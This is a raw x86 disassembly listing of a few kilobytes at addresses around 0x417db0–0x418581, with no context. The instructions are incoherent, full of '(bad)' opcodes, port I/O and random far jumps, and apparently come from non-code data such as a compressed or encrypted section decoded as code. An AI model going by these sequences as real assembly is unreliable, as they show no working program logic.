  417db0:	into   
  417db1:	mov    dh,0x26
  417db3:	or     BYTE PTR [ecx*4-0x1c3d53f9],bl
  417dba:	push   ecx
  417dbb:	out    dx,eax
  417dbc:	jecxz  0x417d87
  417dbe:	call   0x471964c
  417dc3:	or     BYTE PTR [ecx],ch
  417dc5:	mov    WORD PTR ds:0xa9c75a2d,cs
  417dcb:	pushf  
  417dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dcd:	mov    WORD PTR [ebp+0x19],cs
  417dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dd1:	(bad)  
  417dd2:	gs and eax,0x3b8e86d3
  417dd8:	or     al,BYTE PTR [edx-0x4fe175f0]
  417dde:	lock repz popa 
  417de1:	shl    BYTE PTR [esi],1
  417de3:	mov    edi,DWORD PTR [edi]
  417de5:	adc    BYTE PTR [eax],ch
  417de7:	xlat   BYTE PTR ds:[ebx]
  417de8:	mov    al,0x78
  417dea:	or     esi,ebp
  417dec:	jne    0x417d7a
  417dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417def:	mov    bl,0x6d
  417df1:	mov    ss:0x13581512,al
  417df7:	(bad)  
  417df8:	jb     0x417e3c
  417dfa:	nop
  417dfb:	clc    
  417dfc:	pusha  
  417dfd:	mov    ebx,0x1e5f5a89
  417e02:	aad    0xea
  417e04:	rcr    DWORD PTR [ebp+0x3c],cl
  417e07:	shr    DWORD PTR [esi],0xd6
  417e0a:	sub    BYTE PTR [edx],0x14
  417e0d:	cmp    BYTE PTR [edi-0x73],0x9e
  417e11:	popa   
  417e12:	test   al,0x97
  417e14:	popa   
  417e15:	add    eax,0x93332fba
  417e1a:	cmp    al,0xbe
  417e1c:	ret    0x5a63
  417e1f:	push   0xffffffc6
  417e21:	aam    0xbc
  417e23:	arpl   WORD PTR [ebp+0x2],dx
  417e26:	jg     0x417e0a
  417e28:	loopne 0x417e0e
  417e2a:	out    dx,al
  417e2b:	dec    edx
  417e2d:	sbb    dl,BYTE PTR [eax-0x59]
  417e30:	and    bh,BYTE PTR ss:[eax+0x2fb335e4]
  417e37:	repz sbb DWORD PTR [ecx+eiz*1],ecx
  417e3b:	pop    ss
  417e3c:	in     al,0xc2
  417e3e:	or     al,0x45
  417e40:	int3   
  417e41:	sub    DWORD PTR [edx],0x3e
  417e44:	in     al,dx
  417e45:	xchg   ecx,eax
  417e46:	push   ebp
  417e48:	xor    DWORD PTR [ecx],ecx
  417e4a:	cdq    
  417e4b:	push   edx
  417e4c:	push   0xdf0199ed
  417e51:	add    DWORD PTR [eax],ebp
  417e53:	test   al,0x29
  417e55:	pop    es
  417e56:	jne    0x417ded
  417e58:	xor    eax,ecx
  417e5a:	cwde   
  417e5b:	ret    
  417e5c:	(bad)  
  417e5d:	nop
  417e5e:	mov    ebp,DWORD PTR [ecx+0x65d21b9f]
  417e64:	fucom  st(6)
  417e66:	arpl   WORD PTR [esi-0x64],di
  417e69:	jae    0x417e85
  417e6b:	not    BYTE PTR [ebp-0x3503a1c3]
  417e71:	fcom   QWORD PTR [eax]
  417e73:	push   ecx
  417e74:	ret    0x5095
  417e77:	mov    ecx,0x66999d64
  417e7c:	jns    0x417e0a
  417e7e:	xchg   edx,eax
  417e7f:	(bad)  
  417e80:	mov    ebx,0x38f7998c
  417e85:	jmp    0xe1f2:0x7bd68b10
  417e8c:	mov    al,ds:0x3f179f3b
  417e91:	push   esp
  417e92:	mov    ah,0x8
  417e94:	scas   eax,DWORD PTR es:[edi]
  417e95:	pop    ds
  417e96:	into   
  417e97:	sub    DWORD PTR [esi],eax
  417e99:	imul   ebp,DWORD PTR [esi-0xd],0x46a593d8
  417ea0:	push   ds
  417ea1:	call   0xcb7658a8
  417ea6:	lods   eax,DWORD PTR ds:[esi]
  417ea7:	sub    DWORD PTR [ebx],0x8688d803
  417ead:	add    ebx,DWORD PTR [ebp+edx*8+0x2aeb8065]
  417eb4:	mov    cl,BYTE PTR [eax-0x48]
  417eb7:	mov    ch,0x83
  417eb9:	xor    DWORD PTR [edx],esi
  417ebb:	sbb    al,0xfe
  417ebd:	sub    DWORD PTR [edi-0x63c2eddd],edi
  417ec3:	xor    al,0x53
  417ec5:	and    BYTE PTR [esi+0x1],bl
  417ec8:	mov    BYTE PTR [ecx-0x2d],dl
  417ecb:	jecxz  0x417e5c
  417ecd:	nop
  417ece:	addr16 add al,0xaa
  417ed1:	test   dh,cl
  417ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ed4:	jmp    0x34f1:0xfd186e01
  417edb:	cmp    eax,0x2682b169
  417ee0:	cs push ecx
  417ee2:	outs   dx,BYTE PTR ds:[esi]
  417ee3:	scas   al,BYTE PTR es:[edi]
  417ee4:	lds    ebx,FWORD PTR [edi]
  417ee6:	mov    eax,ds:0xd78600dd
  417eeb:	xor    al,0x66
  417eed:	jnp    0x417eb8
  417eef:	mov    ch,0x60
  417ef1:	lahf   
  417ef2:	fninit 
  417ef4:	arpl   WORD PTR [edi],sp
  417ef6:	das    
  417ef7:	adc    al,0x96
  417ef9:	push   eax
  417efa:	pop    esp
  417efb:	push   ecx
  417efc:	and    ecx,DWORD PTR [eax+0x7ae7b7ff]
  417f02:	push   ebx
  417f03:	sub    BYTE PTR [ebx+0x5a184654],ah
  417f09:	dec    esp
  417f0a:	inc    edi
  417f0b:	push   ecx
  417f0c:	mov    esi,0xc76c1895
  417f11:	jne    0x417f41
  417f13:	pop    ecx
  417f14:	jne    0x417f58
  417f16:	xor    BYTE PTR [eax-0x74],0x78
  417f1a:	mov    eax,0xeac961fd
  417f1f:	stos   DWORD PTR es:[edi],eax
  417f20:	inc    ebx
  417f21:	xor    al,0x56
  417f23:	test   al,0x37
  417f25:	pusha  
  417f26:	xchg   BYTE PTR [ebx+0x5aa9e26b],al
  417f2c:	shr    DWORD PTR [esp+ecx*8],1
  417f2f:	or     al,0xf3
  417f31:	pushf  
  417f32:	bound  esi,QWORD PTR ds:0xaf299341
  417f38:	cmp    al,0x6f
  417f3a:	xor    al,0xc5
  417f3c:	push   cs
  417f3d:	arpl   dx,si
  417f3f:	xchg   esp,eax
  417f40:	push   esi
  417f41:	sub    cl,BYTE PTR [ecx+0x4057bdd5]
  417f47:	push   edi
  417f48:	sub    al,0x62
  417f4a:	adc    BYTE PTR [esi+0x16],ch
  417f4d:	ja     0x417efc
  417f4f:	leave  
  417f50:	jnp    0x417eea
  417f52:	out    0xc1,al
  417f54:	loopne 0x417ee7
  417f56:	test   DWORD PTR [edx],esp
  417f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f59:	xchg   ebx,eax
  417f5a:	adc    al,0xba
  417f5c:	pop    edx
  417f5d:	shl    DWORD PTR [ecx+0x286ed0df],cl
  417f63:	cwde   
  417f64:	repz adc dl,bl
  417f67:	mov    cl,0x80
  417f69:	push   eax
  417f6a:	sbb    al,0xf3
  417f6c:	shl    dl,cl
  417f6e:	push   ebp
  417f6f:	mov    al,0xe4
  417f71:	mov    dh,0x1d
  417f73:	test   eax,0xc29b39c
  417f78:	popa   
  417f79:	les    ecx,FWORD PTR [edi-0x4f]
  417f7c:	push   ebp
  417f7d:	mov    WORD PTR [ebp-0x1ab0e059],fs
  417f83:	sar    DWORD PTR [ecx+0x47634463],0x7f
  417f8a:	test   bh,dh
  417f8c:	mov    ds:0x4d40a31a,eax
  417f91:	lods   eax,DWORD PTR ds:[esi]
  417f92:	sbb    cl,BYTE PTR [eax-0x2e58b811]
  417f98:	inc    dl
  417f9a:	sbb    eax,DWORD PTR [ebx]
  417f9c:	psubd  mm7,QWORD PTR [eax+0x3b]
  417fa0:	cmp    DWORD PTR [edi],esi
  417fa2:	inc    edi
  417fa3:	mov    edx,0xc359e68c
  417fa8:	adc    BYTE PTR [esi-0x70],bl
  417fab:	or     al,0x5c
  417fad:	push   0xa504f338
  417fb2:	(bad)  
  417fb4:	push   ebp
  417fb5:	cmp    eax,0xfadaebe7
  417fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fbb:	sub    al,0x8
  417fbd:	mov    edi,0xafc1749b
  417fc2:	idiv   dl
  417fc4:	cli    
  417fc5:	(bad)  
  417fc6:	loopne 0x417fb9
  417fc8:	cmp    ch,BYTE PTR [esi-0x197152bc]
  417fce:	mov    al,ds:0xa04c2684
  417fd3:	add    ah,0xfe
  417fd6:	lods   eax,DWORD PTR ds:[esi]
  417fd7:	pop    ebp
  417fd8:	stos   DWORD PTR es:[edi],eax
  417fd9:	retf   
  417fda:	jnp    0x417f5f
  417fdc:	mov    edx,0x9368ba86
  417fe1:	fst    QWORD PTR [ecx+0x1]
  417fe4:	faddp  st(4),st
  417fe6:	sub    DWORD PTR [edi],ecx
  417fe8:	pop    edx
  417fe9:	dec    esp
  417fea:	cmc    
  417feb:	mov    ch,BYTE PTR [ebx-0x55e95e2a]
  417ff1:	mov    BYTE PTR [edx+ecx*1-0x33b93bfe],bh
  417ff8:	das    
  417ff9:	push   esp
  417ffa:	test   DWORD PTR [edi+edx*8+0x18],ebp
  417ffe:	or     BYTE PTR [edx],ch
  418000:	cli    
  418001:	scas   eax,DWORD PTR es:[edi]
  418002:	in     al,dx
  418003:	pop    ebx
  418004:	add    DWORD PTR [ebx],0x7a
  418007:	pop    esp
  418008:	mov    eax,0xd0373b31
  41800d:	popf   
  41800e:	icebp  
  41800f:	ins    BYTE PTR es:[edi],dx
  418010:	(bad)  
  418013:	push   0x2b
  418015:	mov    ch,0xf2
  418017:	repz and BYTE PTR [esi+edx*8+0x72],bl
  41801c:	test   DWORD PTR [ecx-0x6483f51c],0x68f8cf58
  418026:	xchg   ebx,eax
  418027:	xchg   esp,eax
  418028:	out    dx,al
  418029:	pop    es
  41802a:	mov    gs,WORD PTR [ebx+0x7e]
  41802d:	or     DWORD PTR [esi+ecx*4+0x16],eax
  418031:	aas    
  418032:	xchg   esi,eax
  418033:	mov    WORD PTR [eax-0x36],ss
  418036:	mov    DWORD PTR [eax-0x30],esp
  418039:	pop    eax
  41803a:	adc    ch,BYTE PTR [edi+0x2d538e1d]
  418040:	fnstsw WORD PTR [ecx+eiz*4+0x5b3fefec]
  418047:	mov    eax,ds:0xcd3b94a1
  41804c:	outs   dx,BYTE PTR ds:[esi]
  41804d:	int    0x88
  41804f:	loopne 0x418041
  418051:	jns    0x418097
  418053:	test   eax,0xa425bdcd
  418058:	adc    BYTE PTR [eax],ah
  41805a:	daa    
  41805b:	jne    0x418024
  41805d:	xchg   ebp,eax
  41805e:	aam    0x54
  418060:	mov    ch,0xe1
  418062:	dec    edx
  418063:	xor    esp,0x4d
  418066:	jp     0x418033
  418068:	arpl   WORD PTR [edi-0x4a216e10],di
  41806e:	inc    esp
  41806f:	lods   eax,DWORD PTR ds:[esi]
  418070:	addr16 jno 0x4180c9
  418073:	xlat   BYTE PTR ds:[ebx]
  418074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418075:	xor    ch,BYTE PTR [esi]
  418077:	sahf   
  418078:	pop    ds
  418079:	fsub   st,st(1)
  41807b:	inc    eax
  41807c:	xchg   edx,eax
  41807d:	push   esi
  41807e:	cmp    al,0x1a
  418080:	adc    DWORD PTR [eax+0x49],eax
  418083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418084:	sub    BYTE PTR [edx-0x368ac499],al
  41808a:	in     al,dx
  41808b:	or     DWORD PTR [edi+0x5d3dcec4],esp
  418091:	sub    BYTE PTR [ecx+0x3858ba44],ah
  418097:	push   es
  418098:	lea    edi,cs:[ecx]
  41809b:	jmp    0x2fd1ae85
  4180a0:	out    dx,al
  4180a1:	and    esp,0x2a
  4180a4:	or     BYTE PTR [esp+ecx*8+0x51ef94ea],ch
  4180ab:	std    
  4180ac:	in     eax,0xf5
  4180ae:	push   cs
  4180af:	and    DWORD PTR [ecx],edi
  4180b1:	dec    esi
  4180b2:	rcr    BYTE PTR [edi],cl
  4180b4:	(bad)  
  4180b5:	mov    eax,ds:0xd3664dae
  4180ba:	cld    
  4180bb:	xchg   edi,eax
  4180bc:	xor    bl,cl
  4180be:	shl    DWORD PTR [ebp-0x46],1
  4180c1:	sub    dl,dl
  4180c3:	pop    esi
  4180c4:	push   ds
  4180c5:	(bad)  
  4180c6:	test   al,0x89
  4180c8:	mov    al,ds:0x5d9d6046
  4180cd:	jne    0x418056
  4180cf:	add    al,0x87
  4180d1:	lea    ebp,[eax-0x1630b921]
  4180d7:	or     ah,BYTE PTR [edx]
  4180d9:	popa   
  4180da:	fsub   DWORD PTR [ebx]
  4180dc:	mov    eax,ds:0xbe1735
  4180e1:	mov    ss,WORD PTR [ebx+ebx*8]
  4180e4:	xchg   BYTE PTR [eax+0x3088593b],bh
  4180ea:	scas   al,BYTE PTR es:[edi]
  4180eb:	xchg   ebx,eax
  4180ec:	xchg   esp,eax
  4180ed:	ret    0xd34d
  4180f0:	retf   
  4180f1:	daa    
  4180f2:	stos   DWORD PTR es:[edi],eax
  4180f3:	jecxz  0x418144
  4180f5:	dec    ebp
  4180f6:	loopne 0x4180ea
  4180f8:	adc    BYTE PTR ds:0xd124265d,al
  4180fe:	arpl   WORD PTR [ebp+eax*4+0x3bc9947b],sp
  418105:	stos   DWORD PTR es:[edi],eax
  418106:	add    bl,BYTE PTR [ebp-0x23b78320]
  41810c:	neg    bl
  41810e:	cmp    ebp,DWORD PTR [edx]
  418110:	loope  0x4180b4
  418112:	or     eax,0xc34b3f70
  418117:	or     ebp,DWORD PTR [edi]
  418119:	(bad)  
  41811a:	sub    al,0x8c
  41811c:	push   edi
  41811d:	popf   
  41811e:	cmp    ecx,DWORD PTR [edi+edi*1]
  418121:	fwait
  418122:	lahf   
  418123:	ja     0x418143
  418125:	add    dh,BYTE PTR [ebx]
  418127:	(bad)  
  418128:	sub    dl,ah
  41812a:	ins    DWORD PTR es:[edi],dx
  41812b:	and    eax,0xb5c68ac0
  418130:	jl     0x418152
  418132:	xchg   edx,eax
  418133:	repnz sub DWORD PTR [edi+0x19dedcff],ebp
  41813a:	jbe    0x4181b4
  41813c:	sbb    esi,DWORD PTR [ecx+0x9]
  41813f:	ror    DWORD PTR [edx-0x1a],1
  418142:	jb     0x418114
  418144:	es cli 
  418146:	xchg   esp,eax
  418147:	in     eax,dx
  418148:	sub    BYTE PTR [ebx+0x3],al
  41814b:	sbb    al,0xad
  41814d:	cmc    
  41814e:	ror    BYTE PTR ds:0x24b4dd9a,0xf
  418155:	sbb    DWORD PTR [eax-0x70],edx
  418158:	adc    esp,ebp
  41815a:	inc    eax
  41815b:	xchg   DWORD PTR [edx-0x36e32674],edi
  418161:	pop    ecx
  418162:	icebp  
  418163:	fild   WORD PTR [esi-0x62fd5fd1]
  418169:	mov    cl,0xfb
  41816b:	lock popf 
  41816d:	neg    BYTE PTR [eax+0x17]
  418170:	call   FWORD PTR [ebx-0x5ff0465]
  418176:	jecxz  0x4181ad
  418178:	adc    cl,BYTE PTR ds:[esi+0x12]
  41817c:	push   ss
  41817d:	and    cl,BYTE PTR [esi-0x27]
  418180:	push   ecx
  418181:	push   ecx
  418182:	scas   al,BYTE PTR es:[edi]
  418183:	pop    ebx
  418184:	or     DWORD PTR [eax+0x928a90a],0xffffff91
  41818b:	xchg   edi,eax
  41818c:	call   0x14705edb
  418191:	test   DWORD PTR [ebx-0x3cee2461],esi
  418197:	pop    edi
  418198:	mov    ebp,ebp
  41819a:	mov    ebp,ebx
  41819c:	(bad)  
  41819d:	adc    eax,ebx
  41819f:	mov    esi,0xfb4e79b3
  4181a4:	ja     0x418215
  4181a6:	and    DWORD PTR [ebx],ebp
  4181a8:	mov    cl,0xbb
  4181aa:	sbb    al,0x3a
  4181ac:	ret    
  4181ad:	xchg   edi,eax
  4181ae:	les    edx,FWORD PTR [edx-0x49]
  4181b1:	addr16 and eax,0xd9704ee4
  4181b7:	ficom  DWORD PTR [edx]
  4181b9:	loop   0x41816a
  4181bb:	jecxz  0x4181a6
  4181bd:	jo     0x4181b8
  4181bf:	in     al,dx
  4181c0:	mov    ?,WORD PTR ss:[ecx+edi*4]
  4181c4:	dec    ebx
  4181c5:	add    BYTE PTR [eax-0x25],ch
  4181c8:	push   cs
  4181c9:	pusha  
  4181ca:	clc    
  4181cb:	jnp    0x418192
  4181cd:	leave  
  4181ce:	push   ds
  4181cf:	pop    ecx
  4181d0:	(bad)  
  4181d1:	xor    ah,BYTE PTR [edx+0x4a976c86]
  4181d7:	cmp    DWORD PTR [esi],ebp
  4181d9:	mov    ecx,0x8eb2d3df
  4181de:	(bad)  
  4181df:	adc    bl,BYTE PTR [esi+0x8]
  4181e2:	mov    bh,BYTE PTR [edx+0xe6c98a6]
  4181e8:	lock in al,dx
  4181ea:	popf   
  4181eb:	in     al,dx
  4181ec:	dec    DWORD PTR [edi]
  4181ee:	xchg   esi,eax
  4181ef:	pop    ss
  4181f0:	scas   eax,DWORD PTR es:[edi]
  4181f1:	in     eax,0xeb
  4181f3:	scas   al,BYTE PTR es:[edi]
  4181f4:	jb     0x4181a7
  4181f6:	push   ecx
  4181f7:	mov    al,ds:0x4db4683a
  4181fc:	dec    ecx
  4181fd:	jae    0x418253
  4181ff:	jl     0x41818f
  418201:	cs in  al,0x41
  418204:	xor    al,0x48
  418206:	(bad)  
  418208:	gs loop 0x4181ac
  41820b:	adc    esp,DWORD PTR [edi]
  41820d:	mov    esi,0x80c70183
  418212:	jle    0x41824a
  418214:	pop    eax
  418215:	lea    edx,[edi-0x7a3caf63]
  41821b:	aas    
  41821c:	fistp  DWORD PTR [edx-0x1ae24fb9]
  418222:	and    al,0x90
  418224:	div    BYTE PTR [edx+0x50da6ad9]
  41822a:	into   
  41822b:	aad    0x8
  41822d:	out    dx,eax
  41822e:	fisub  WORD PTR [esi+0x5481e324]
  418234:	sti    
  418235:	rcr    DWORD PTR [ebx],cl
  418237:	leave  
  418238:	ja     0x418223
  41823a:	adc    esi,DWORD PTR [edx+0x74d844de]
  418240:	retf   0xe1f8
  418243:	push   esi
  418244:	adc    BYTE PTR [ecx+0x30a013e7],0xa3
  41824b:	aaa    
  41824c:	cmc    
  41824d:	mov    al,ds:0x7fd43c52
  418252:	pop    esi
  418253:	cs daa 
  418255:	xor    eax,0x38e2608e
  41825a:	and    eax,0xe5bab011
  41825f:	or     eax,0x9bde1e9f
  418264:	xchg   DWORD PTR [ebp-0x75],edi
  418267:	or     BYTE PTR [edi*2-0x27373ce9],bh
  41826e:	ficomp DWORD PTR [edi+0x76b22579]
  418274:	mov    al,ds:0x9d4d2268
  418279:	retf   0xff6f
  41827c:	adc    ebp,DWORD PTR [edi+0x61]
  41827f:	mov    DWORD PTR [edi],esi
  418281:	lock jae 0x418260
  418284:	jns    0x4182cf
  418286:	mov    ds:0x9ad221ec,al
  41828b:	je     0x41823c
  41828d:	mov    al,0x62
  41828f:	jb     0x418254
  418291:	imul   DWORD PTR [edx+0x57944bc8]
  418297:	repz enter 0xa436,0x33
  41829c:	into   
  41829d:	jg     0x4182cf
  41829f:	ds mov esi,0x73547559
  4182a5:	and    al,0xb2
  4182a7:	popf   
  4182a8:	adc    al,0x6a
  4182aa:	pop    edi
  4182ab:	sar    BYTE PTR [edx-0x79eac88e],cl
  4182b1:	mov    al,ds:0x34c820a5
  4182b6:	ins    BYTE PTR es:[edi],dx
  4182b7:	cdq    
  4182b8:	push   ss
  4182b9:	pop    esi
  4182ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182bb:	mov    dl,0x67
  4182bd:	or     eax,0x85642506
  4182c2:	fcomip st,st(4)
  4182c4:	addr16 in al,0x17
  4182c7:	stos   BYTE PTR es:[edi],al
  4182c8:	(bad)  
  4182c9:	mov    ds:0x563c1f1b,eax
  4182ce:	(bad)  
  4182cf:	aad    0xd2
  4182d1:	xchg   ecx,eax
  4182d2:	shl    BYTE PTR [ebx-0x52],cl
  4182d5:	pop    ecx
  4182d6:	call   0x7b71f71e
  4182db:	enter  0xcea4,0x83
  4182df:	nop
  4182e0:	dec    ebx
  4182e1:	les    eax,FWORD PTR [edx+0x2b00bd5d]
  4182e7:	lods   al,BYTE PTR ds:[esi]
  4182e8:	repnz mov ah,0x51
  4182eb:	repz pop ss
  4182ed:	add    DWORD PTR [eax+0x7a],ebx
  4182f0:	dec    esp
  4182f1:	(bad)  
  4182f2:	mul    DWORD PTR [esp+eiz*2+0x30e42d62]
  4182f9:	ja     0x4182c7
  4182fb:	shr    esi,cl
  4182fd:	mov    ecx,0xe84af8f8
  418302:	jg     0x41829c
  418304:	and    dl,dl
  418306:	in     al,0xd4
  418308:	push   ds
  418309:	mov    esi,0x8978cb93
  41830e:	sub    DWORD PTR [ecx+0x38],edx
  418311:	into   
  418312:	fdivr  st,st(6)
  418314:	cmp    dh,al
  418316:	push   ds
  418317:	push   cs
  418318:	push   ebp
  418319:	cmp    edx,eax
  41831b:	arpl   WORD PTR [ebx],ax
  41831d:	fbld   TBYTE PTR [ebx+0x2e39e65c]
  418323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418324:	aaa    
  418325:	clc    
  418326:	and    al,0x4b
  418328:	mov    esi,0xf13adb28
  41832d:	sbb    eax,0xd4065ac9
  418332:	fnstcw WORD PTR [edi-0x3c]
  418335:	cmp    BYTE PTR [edx],al
  418337:	bound  bp,DWORD PTR [edx+0x13c92625]
  41833e:	jb     0x41836d
  418340:	sbb    DWORD PTR [ebp-0x38],0xebb89c53
  418347:	rcl    BYTE PTR [esi+eiz*2],1
  41834a:	xor    BYTE PTR [ebp+edx*2+0x69aa73fb],dh
  418351:	push   ebx
  418352:	jb     0x4182d4
  418354:	xor    DWORD PTR [ebx-0x1e9533d1],0x650abc73
  41835e:	mov    edi,0x738da1ba
  418363:	push   ebx
  418364:	or     dl,BYTE PTR [ebx+0x60]
  418367:	das    
  418368:	mov    edx,0x60bb03e0
  41836d:	add    al,0xed
  41836f:	inc    ebx
  418370:	jb     0x418346
  418372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418373:	xchg   ecx,eax
  418374:	ret    
  418375:	mov    ah,0xdd
  418377:	(bad)  
  418378:	jmp    0xb7d884f8
  41837d:	and    edi,DWORD PTR [ebp+eax*8+0x1c327a9b]
  418384:	enter  0x1452,0xd4
  418388:	cmp    esp,DWORD PTR [ebp+ebp*1-0x4c1f2978]
  41838f:	lods   eax,DWORD PTR ds:[esi]
  418390:	scas   al,BYTE PTR es:[edi]
  418391:	sar    DWORD PTR [eax],cl
  418393:	repnz add al,dh
  418396:	add    edi,0x40
  418399:	push   edx
  41839a:	xchg   edi,eax
  41839b:	mov    ds:0xd05fd54a,al
  4183a0:	sub    edi,DWORD PTR [edi+eax*8-0x1d70154b]
  4183a7:	bound  ecx,QWORD PTR [esi+0x1d]
  4183aa:	xlat   BYTE PTR ds:[ebx]
  4183ab:	mov    al,ds:0xe676bc05
  4183b0:	test   DWORD PTR [esi+ebx*1],ebx
  4183b3:	vpaddd xmm6,xmm6,XMMWORD PTR [eax+esi*8]
  4183b8:	jbe    0x41835d
  4183ba:	rol    DWORD PTR [eax+0x17],1
  4183bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183be:	pop    es
  4183bf:	push   0x85d83cc3
  4183c4:	cli    
  4183c5:	inc    edi
  4183c6:	push   eax
  4183c7:	fst    QWORD PTR [ebx+0x212f598b]
  4183cd:	sbb    DWORD PTR [ecx-0x5d205513],0x8dda31b5
  4183d7:	scas   al,BYTE PTR es:[edi]
  4183d8:	(bad)  
  4183da:	push   ecx
  4183db:	arpl   WORD PTR [ecx+0x34],bp
  4183de:	lds    esp,FWORD PTR [esi+0x55653dc5]
  4183e4:	ret    
  4183e5:	loope  0x4183c0
  4183e7:	and    cl,BYTE PTR [edi-0x49]
  4183ea:	push   esp
  4183eb:	pop    edi
  4183ec:	ffree  st(7)
  4183ee:	xchg   ecx,eax
  4183ef:	repz inc ebx
  4183f1:	sar    BYTE PTR [edx+0x63c4acaa],0x3
  4183f8:	cld    
  4183f9:	and    eax,0x3b5dfc18
  4183fe:	icebp  
  4183ff:	aad    0xba
  418401:	push   0xb580781f
  418406:	clc    
  418407:	xor    eax,0x37a7270b
  41840c:	std    
  41840d:	dec    esi
  41840e:	pop    ebx
  41840f:	xor    eax,0x963b12b2
  418414:	loope  0x418420
  418416:	xlat   BYTE PTR ds:[ebx]
  418417:	je     0x418442
  418419:	pop    ebx
  41841a:	data16 mov bh,bh
  41841d:	cmp    BYTE PTR [edx],al
  41841f:	jno    0x418414
  418421:	push   ecx
  418422:	test   ebx,edi
  418424:	push   edi
  418425:	test   eax,0xa3d3fbe3
  41842a:	cli    
  41842b:	xchg   ebx,eax
  41842c:	fst    DWORD PTR [eax+0x79]
  41842f:	aas    
  418430:	sbb    eax,0x7e842c18
  418435:	xor    al,0x4e
  418437:	gs push eax
  418439:	mov    edx,DWORD PTR [esi+ebx*8-0x78]
  41843d:	adc    ah,BYTE PTR ss:[ebx-0x11528fce]
  418444:	mov    ebx,0x8cbf576f
  418449:	js     0x418492
  41844b:	cmp    BYTE PTR [ebp-0x57fa2457],dh
  418451:	add    al,0x36
  418453:	imul   esi,edi,0xfabec2e3
  418459:	and    al,BYTE PTR [edi-0x284ab7c]
  41845f:	add    eax,0xc85e5a2d
  418464:	mov    edi,0x83ab6d59
  418469:	add    DWORD PTR [edx-0x5d],esi
  41846c:	xchg   BYTE PTR [ecx-0x19aa0a3],bh
  418472:	(bad)  
  418473:	out    dx,al
  418474:	ret    
  418475:	cmc    
  418476:	and    BYTE PTR [edi-0xd3362aa],bh
  41847c:	aas    
  41847d:	jb     0x41842b
  41847f:	jb     0x4184c1
  418481:	rcl    DWORD PTR [esi+0x44],1
  418484:	adc    ah,BYTE PTR [eax]
  418486:	pop    ecx
  418487:	sbb    ah,BYTE PTR [edx]
  418489:	sub    dh,bl
  41848b:	jg     0x418461
  41848d:	adc    edi,DWORD PTR [ecx-0x3e]
  418490:	cmp    edx,eax
  418492:	and    BYTE PTR [eax],0x61
  418495:	fisttp QWORD PTR [edi+0x541e44f0]
  41849b:	push   es
  41849c:	jp     0x41849c
  41849e:	and    al,cl
  4184a0:	inc    esp
  4184a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184a2:	pop    edi
  4184a3:	add    eax,0xfb232150
  4184a8:	arpl   WORD PTR [ecx-0x21],dx
  4184ab:	jp     0x418524
  4184ad:	hlt    
  4184ae:	sub    al,0xba
  4184b0:	mov    WORD PTR [eax-0x624f66b3],?
  4184b6:	and    bh,0x3
  4184b9:	loop   0x418460
  4184bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184bc:	scas   eax,DWORD PTR es:[edi]
  4184bd:	xchg   ebx,eax
  4184be:	jg     0x418447
  4184c0:	repz push eax
  4184c2:	cmp    BYTE PTR [edi+edi*2-0x5cc98979],dl
  4184c9:	iret   
  4184ca:	shl    DWORD PTR [ebp-0x27],0xbd
  4184ce:	adc    eax,0xd66c2d7c
  4184d3:	lds    esi,FWORD PTR ds:0x964c68d8
  4184d9:	mov    cs,WORD PTR [edi+0x131fcfce]
  4184df:	loopne 0x418480
  4184e1:	call   0x5cca:0xb4e26e8e
  4184e8:	hlt    
  4184e9:	fwait
  4184ea:	and    bl,dh
  4184ec:	shl    DWORD PTR [eax+esi*2],1
  4184ef:	test   DWORD PTR [edi],esp
  4184f1:	jne    0x4184b3
  4184f3:	cmp    esi,edx
  4184f5:	cld    
  4184f6:	fwait
  4184f7:	cmp    ebx,DWORD PTR [edx*1+0x10d7c031]
  4184fe:	shl    DWORD PTR [ebx],cl
  418500:	test   DWORD PTR [ecx+0x4949d83b],0x8f50b671
  41850a:	mov    edx,0x795e21c4
  41850f:	repnz push es
  418511:	outs   dx,DWORD PTR ds:[esi]
  418512:	test   BYTE PTR [esi],bl
  418514:	int3   
  418515:	in     al,0x8a
  418517:	ins    BYTE PTR es:[edi],dx
  418518:	push   esi
  418519:	or     esp,ebx
  41851b:	mov    ch,0xe8
  41851d:	retf   
  41851e:	pop    edi
  41851f:	sbb    edi,DWORD PTR [ecx+ebp*2-0x6c]
  418523:	test   BYTE PTR [ebx],0xb6
  418526:	rcr    DWORD PTR [esi-0x70566f0f],cl
  41852c:	pop    ebp
  41852d:	xchg   dl,dl
  41852f:	pop    edx
  418530:	push   edx
  418531:	popa   
  418532:	jns    0x418549
  418534:	adc    al,0xf1
  418536:	(bad)  
  418537:	aad    0x4f
  418539:	ret    0xab28
  41853c:	dec    esp
  41853d:	push   eax
  41853e:	xor    BYTE PTR [ebx-0xc],bh
  418541:	idiv   BYTE PTR [edi+esi*4]
  418544:	mov    al,ds:0x95f88f34
  418549:	out    0xfa,al
  41854b:	adc    DWORD PTR [esi],ecx
  41854d:	scas   al,BYTE PTR es:[edi]
  41854e:	add    al,0xcd
  418550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418551:	sbb    BYTE PTR [ebx],cl
  418553:	pop    ds
  418554:	idiv   BYTE PTR [eax+ebp*1-0x2a]
  418558:	fs fcmovnb st,st(2)
  41855b:	stc    
  41855c:	mov    edi,0xdcb9ac57
  418561:	mov    bl,0x54
  418563:	sub    DWORD PTR [eax],ecx
  418565:	sbb    BYTE PTR gs:[eax],bl
  418568:	adc    DWORD PTR [ebx],0xb
  41856b:	xor    ah,BYTE PTR [ebx]
  41856d:	cld    
  41856e:	mov    ebx,0xe75c4101
  418573:	test   DWORD PTR [ebx],ebx
  418575:	in     al,0x9c
  418577:	(bad)  
  418578:	jmp    0x41856e
  41857a:	push   es
  41857b:	jb     0x418591
  41857d:	fist   WORD PTR [esp+ecx*8-0x45]
  418581:	inc    eax
